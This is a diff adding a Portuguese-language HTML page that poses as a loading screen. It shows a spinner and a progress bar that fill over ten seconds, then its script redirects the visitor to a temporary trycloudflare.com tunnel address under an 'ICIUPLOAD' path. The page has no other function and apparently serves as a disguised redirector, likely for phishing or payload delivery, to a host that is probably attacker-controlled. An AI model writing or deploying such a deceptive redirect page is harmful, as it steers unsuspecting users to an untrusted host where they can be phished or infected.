@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Carregando...</title>
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    height: 100vh;
+    background: #000;
+    color: #fff;
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+  }
+  .loader {
+    width: 50px;
+    height: 50px;
+    border: 3px solid #1a1a1a;
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: girar 0.8s linear infinite;
+  }
+  #pct {
+    margin-top: 24px;
+    font-size: 14px;
+    letter-spacing: 2px;
+  }
+  .barra {
+    width: 240px;
+    height: 2px;
+    background: #1a1a1a;
+    margin-top: 16px;
+    overflow: hidden;
+  }
+  #progresso {
+    height: 100%;
+    width: 0%;
+    background: #fff;
+  }
+  @keyframes girar {
+    to { transform: rotate(360deg); }
+  }
+</style>
+</head>
+<body>
+
+  <div class="loader"></div>
+  <p id="pct">0%</p>
+  <div class="barra"><div id="progresso"></div></div>
+
+<script>
+  let tempo = 0;
+  const progresso = document.getElementById('progresso');
+  const pct = document.getElementById('pct');
+
+  const timer = setInterval(() => {
+    tempo += 0.1;
+    let porcentagem = (tempo / 10) * 100;
+
+    if (porcentagem > 100) porcentagem = 100;
+
+    progresso.style.width = porcentagem + '%';
+    pct.innerText = Math.floor(porcentagem) + '%';
+
+    if (tempo >= 10) {
+      clearInterval(timer);
+      window.location.href = "https://unlikely-alfred-cuts-reasonable.trycloudflare.com/ici/storage/ICIUPLOAD/";
+    }
+  }, 100);
+</script>
+
+</body>
+</html>
